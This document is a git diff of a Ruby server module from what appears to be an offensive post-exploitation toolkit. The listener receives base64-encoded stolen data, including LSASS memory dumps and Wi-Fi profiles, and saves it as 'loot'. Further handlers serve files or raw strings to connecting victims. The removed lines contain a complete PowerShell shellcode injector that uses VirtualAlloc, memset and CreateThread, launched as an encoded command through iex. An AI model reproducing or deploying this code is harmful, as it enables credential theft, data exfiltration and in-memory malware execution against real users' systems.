@@ -29,13 +29,17 @@ module Server
     end
 
     def port
-      port = rgets('Enter the port you would like to use[443]: ', 443)
+      port = rgets('Enter the port you would like to use [443]: ', 443)
       until (1..65_535).cover?(port.to_i)
         print_error('Not a valid port')
         sleep(1)
       end
       print_success("Using #{port}")
       port
+    end
+
+    def uri
+      rgets('Enter the URI: ', '')
     end
 
     def host_payload?
@@ -60,33 +64,37 @@ module Server
     def initialize(ssl, host, port)
       Dir.mkdir(loot_dir) unless Dir.exist?(loot_dir)
       if ssl
-        print_info("Starting SSL Server!\n")
+        Menu.opts[:banner][:host] = host
+        Menu.opts[:banner][:ports] = port
         @server = Server::Setup.new.ssl(host, port.to_i)
+        print_info("Starting SSL Server!\n")
       else
-        print_info("Starting Server!\n")
+        Menu.opts[:banner][:host] = host
+        Menu.opts[:banner][:ports] = port
         @server = TCPServer.open(port.to_i)
+        print_info("Starting Server!\n")
       end
     end
 
-    def listener(type)
+    def listener(type = '')
       loop do
         Thread.start(@server.accept) do |client|
           print_info("Client Connected.\n")
           file_name = client.gets
-          file_name = _clean_name(file_name)
+          file_name.strip!
           print_success("Got #{file_name} file!\n")
           print_info("Getting Data\n")
           out_put = client.gets
           print_info("Writing to File\n")
           case type
           when 'lsass'
-            file_name = "#{file_name}_#{_timestamp}.dmp"
+            final = "#{file_name}_#{_timestamp}.dmp"
           when 'wifi'
-            file_name = "#{file_name}_#{_timestamp}.xml"
+            final = "#{file_name}_#{_timestamp}.xml"
           else
-            file_name = "#{file_name}_#{_timestamp}"
+            final = "#{file_name}_#{_timestamp}"
           end
-          File.open("#{loot_dir}#{file_name}", 'w') do |f|
+          File.open("#{loot_dir}#{final}", 'w') do |f|
             f.write(Base64.decode64(out_put))
           end
           print_success("File Done!\n")
@@ -97,14 +105,15 @@ module Server
       print_error(error)
     end
 
-    def host_file
+    def host_file(path)
       time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
       loop do
         Thread.start(@server.accept) do |client|
+          print_info("Client Connected.\n")
           request = client.gets
           request_uri = request.split(' ')[1]
           path = URI.unescape(URI(request_uri).path)
-          if File.exist(path) && !File.directory?(path)
+          if File.exist?(path) && !File.directory?(path)
             File.open(path) do |f|
               headers = ['HTTP/1.1 200 OK',
                          "Date: #{time}",
@@ -129,26 +138,8 @@ module Server
       end
     end
 
-    def host_raw(shellcode)
+    def host_raw(raw_string)
       time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
-      s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
-      s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
-      s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
-      s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
-      s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
-      s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
-      s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
-      s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
-      s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
-      s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
-      s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
-      s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
-      s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
-      s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
-      s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
-      s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop )
-      s << %(-noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";)
-      s << %(iex "& powershell $cmd $gq";})
       loop do
         begin
           Thread.start(@server.accept) do |client|
@@ -157,9 +148,9 @@ module Server
                        "Date: #{time}",
                        'Server: Ruby',
                        'Content-Type: text/html; charset=iso-8859-1',
-                       "Content-Length: #{s.length}\r\n\r\n"].join("\r\n")
+                       "Content-Length: #{raw_string.length}\r\n\r\n"].join("\r\n")
             client.print headers
-            client.print "#{s}\n"
+            client.print "#{raw_string}\n"
             client.close
           end
         rescue => e
@@ -167,19 +158,11 @@ module Server
         end
       end
     end
-    trap('INT') do
-      print_info('Caught CTRL-C stopping server!')
-      exit
+
+    private
+
+    def _timestamp
+      Time.now.strftime('%Y_%m_%d_%H_%M_%S')
     end
-  end
-
-  private
-
-  def _timestamp
-    Time.now.strftime('%Y_%m_%d_%H_%M_%S')
-  end
-
-  def _clean_name(name)
-    name.stip
   end
 end
